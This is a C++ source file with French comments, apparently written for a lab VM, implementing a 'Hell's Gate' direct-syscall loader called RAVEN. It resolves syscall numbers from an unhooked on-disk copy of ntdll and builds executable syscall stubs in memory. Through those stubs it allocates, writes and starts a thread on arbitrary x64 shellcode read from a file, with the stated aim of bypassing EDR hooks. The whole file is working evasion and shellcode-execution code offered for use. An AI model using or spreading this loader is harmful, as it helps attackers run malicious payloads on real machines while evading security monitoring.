// language: C++17, file: syscalls_direct.cpp, target: Windows x64 (lab VM)
// HELL'S GATE simplifié : les SSN sont résolus depuis ntdll SUR DISQUE (copie propre,
// jamais hookée), puis des stubs syscall sont construits en mémoire.
// Résultat : AUCUN appel vers ntdll.dll en mémoire — les hooks EDR sont contournés.
// Usage: syscalls_direct.exe [payload.bin]   (shellcode x64 exécuté via NtCreateThreadEx direct)
#include <windows.h>
#include <cstdio>
#include <cstring>

typedef long NTSTATUS;
typedef NTSTATUS (NTAPI *pSyscall)(...);

// ---- résolution Hell's Gate : SSN depuis ntdll sur disque ----
static unsigned short ResolveSSN(const char* funcName) {
    // 1. lit ntdll.dll PROPRE depuis le disque (le fichier n'est jamais hooké)
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
                               FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0xFFFF;
    DWORD sz = GetFileSize(hFile, NULL);
    BYTE* raw = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    DWORD rd;
    ReadFile(hFile, raw, sz, &rd, NULL);
    CloseHandle(hFile);

    // 2. parse les exports PE
    auto dos = (PIMAGE_DOS_HEADER)raw;
    auto nt  = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
    auto expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto exp    = (PIMAGE_EXPORT_DIRECTORY)(raw + expDir.VirtualAddress);
    auto names  = (DWORD*)(raw + exp->AddressOfNames);
    auto ordinals = (WORD*)(raw + exp->AddressOfNameOrdinals);
    auto funcs  = (DWORD*)(raw + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(raw + names[i]);
        if (!_stricmp(name, funcName)) {
            BYTE* stub = raw + funcs[ordinals[i]];
            // le stub Zw* commence par : mov r10, rcx ; mov eax, SSN (4C 8B D1 B8 xx xx xx xx)
            if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
                unsigned short ssn = *(unsigned short*)(stub + 4) & 0xFFF;
                VirtualFree(raw, 0, MEM_RELEASE);
                return ssn;
            }
        }
    }
    VirtualFree(raw, 0, MEM_RELEASE);
    return 0xFFFF;
}

// ---- stub syscall construit en mémoire (Hell's Gate : syscall;ret 0x0F05C3) ----
static void* BuildStub(unsigned short ssn) {
    void* mem = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    BYTE stub[16] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, (BYTE)(ssn & 0xFF), (BYTE)((ssn >> 8) & 0xFF), 0, 0,  // mov eax, ssn
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    memcpy(mem, stub, 16);
    return mem;
}

// NtAllocateVirtualMemory direct
static NTSTATUS DirectAlloc(HANDLE proc, PVOID* base, ULONG_PTR zero, PSIZE_T size, ULONG prot) {
    unsigned short ssn = ResolveSSN("NtAllocateVirtualMemory");
    if (ssn == 0xFFFF) return -1;
    auto stub = (pSyscall)BuildStub(ssn);
    HANDLE hProc = (proc) ? proc : (HANDLE)-1;   // -1 = self
    NTSTATUS st = stub(hProc, base, zero, size, MEM_COMMIT | MEM_RESERVE, prot);
    return st;
}

// NtCreateThreadEx direct
static NTSTATUS DirectThread(HANDLE* out, HANDLE proc, LPTHREAD_START_ROUTINE addr, PVOID arg) {
    unsigned short ssn = ResolveSSN("NtCreateThreadEx");
    if (ssn == 0xFFFF) return -1;
    auto stub = (pSyscall)BuildStub(ssn);
    // signature simplifiée : les 5 derniers args = NULL
    NTSTATUS st = stub(out, 0x1FFFFF, NULL, proc, addr, arg, FALSE, 0, 0, 0, NULL);
    return st;
}

int main(int argc, char** argv) {
    printf("[*] RAVEN — syscalls directs (Hell's Gate)\n");
    unsigned short ssnAlloc = ResolveSSN("NtAllocateVirtualMemory");
    unsigned short ssnWrite = ResolveSSN("NtWriteVirtualMemory");
    unsigned short ssnThread = ResolveSSN("NtCreateThreadEx");
    printf("[*] SSN résolus depuis ntdll DISQUE (jamais hookée) :\n");
    printf("    NtAllocateVirtualMemory : 0x%02X\n", ssnAlloc);
    printf("    NtWriteVirtualMemory    : 0x%02X\n", ssnWrite);
    printf("    NtCreateThreadEx        : 0x%02X\n", ssnThread);
    if (ssnAlloc == 0xFFFF) { printf("[X] résolution échouée\n"); return 1; }

    // payload depuis fichier (shellcode x64 — démo : celui que TU fournis)
    if (argc < 2) { printf("[i] sans payload : démo = alloc + write + thread sur stub NOP/RET\n"); }
    BYTE demo[] = { 0xC3 };  // ret immédiat : preuve d'exécution inoffensive
    BYTE* payload = demo;
    SIZE_T plen = sizeof(demo);
    FILE* f = NULL;
    if (argc > 1) {
        fopen_s(&f, argv[1], "rb");
        if (f) {
            fseek(f, 0, SEEK_END); plen = ftell(f); fseek(f, 0, SEEK_SET);
            payload = (BYTE*)malloc(plen);
            fread(payload, 1, plen, f); fclose(f);
            printf("[*] payload %llu octets chargé depuis %s\n", (unsigned long long)plen, argv[1]);
        }
    }

    PVOID base = NULL;
    SIZE_T size = plen;
    NTSTATUS st = DirectAlloc(NULL, &base, 0, &size, PAGE_EXECUTE_READWRITE);
    printf("[*] NtAllocateVirtualMemory direct : 0x%08lX (base %p)\n", st, base);
    if (st >= 0 && base) {
        // NtWriteVirtualMemory direct
        unsigned short w = ResolveSSN("NtWriteVirtualMemory");
        auto stubW = (pSyscall)BuildStub(w);
        SIZE_T written = 0;
        stubW((HANDLE)-1, base, (PVOID)payload, plen, &written);
        printf("[*] NtWriteVirtualMemory direct : %llu octets écrits\n", (unsigned long long)written);

        HANDLE t = NULL;
        st = DirectThread(&t, NULL, (LPTHREAD_START_ROUTINE)base, NULL);
        printf("[*] NtCreateThreadEx direct : 0x%08lX (thread %p)\n", st, t);
        WaitForSingleObject(t, 3000);
        printf("[OK] la chaîne syscall complète est passée — AUCUN appel ntdll en mémoire\n");
    }
    return 0;
}
